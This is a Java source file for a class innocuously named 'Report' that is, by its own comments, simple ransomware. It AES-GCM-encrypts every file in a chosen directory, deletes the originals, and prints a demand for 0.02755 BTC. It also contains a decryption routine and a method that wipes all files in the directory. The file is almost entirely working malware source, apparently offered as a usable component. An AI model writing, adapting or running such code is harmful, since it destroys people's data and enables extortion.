import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class Report {
    // AES - Cryptography Params
    private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
    private static final int TAG_LENGTH_BIT = 128;
    private static final int IV_LENGTH_BYTE = 12;
    private static Report instance;
    public Port port;
    // Ransomware Params
    private File directory;
    private SecretKey secretKey;
    private byte[] nonce;
    private boolean isEncrypted;

    private Report() {
        this.port = new Port();

        this.isEncrypted = false;

        // Ransomware Params
        this.isEncrypted = false;

        // AES - Cryptography Params
        try {
            this.nonce = AESCryptoUtils.getRandomNonce(IV_LENGTH_BYTE);
            this.secretKey = AESCryptoUtils.getAESKey();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public static Report getInstance() {
        if (instance == null) {
            instance = new Report();
        }
        return instance;
    }

    public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(pText);
    }

    public static byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(cText);
    }

    private static byte[] readContentIntoByteArray(File file) {
        FileInputStream fileInputStream;
        byte[] bFile = new byte[(int) file.length()];
        try {
            //convert file into byte[]
            fileInputStream = new FileInputStream(file);
            fileInputStream.read(bFile);
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bFile;
    }

    public boolean innerStartEncryption(String directory) throws Exception {
        if (!isEncrypted) {
            this.directory = new File(String.valueOf(Paths.get(directory).toAbsolutePath()));
            // Arraylist of all files in said directory
            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(this.directory.listFiles())) {
                if (!fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for encryption
            for (File f : files) {
                byte[] decrFile = readContentIntoByteArray(f);
                byte[] encrFile = encrypt(decrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath() + ".mcg")) {
                    fos.write(encrFile);
                }
                f.delete();
            }

            isEncrypted = true;

            System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
            return true;
        } else {
            return false;
        }
    }

    public void innerStartDecryption() throws Exception {
        if (isEncrypted) {
            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
                if (fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for decryption
            for (File f : files) {
                byte[] encrFile = readContentIntoByteArray(f);
                byte[] decrFile = decrypt(encrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath().split(".mcg")[0])) {
                    fos.write(decrFile);
                }
                f.delete();
            }
            isEncrypted = false;
        }
    }

    private void innerDeleteALlFiles() {
        List<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(directory.listFiles())));

        for (File f : files) {
            f.delete();
        }
    }


    public class Port implements IReport {

        @Override
        public boolean startEncryption(String directory) throws Exception {
            return innerStartEncryption(directory);
        }

        @Override
        public void startDecryption() throws Exception {
            innerStartDecryption();
        }

        @Override
        public void deleteAllFiles() {
            innerDeleteALlFiles();
        }
    }
}


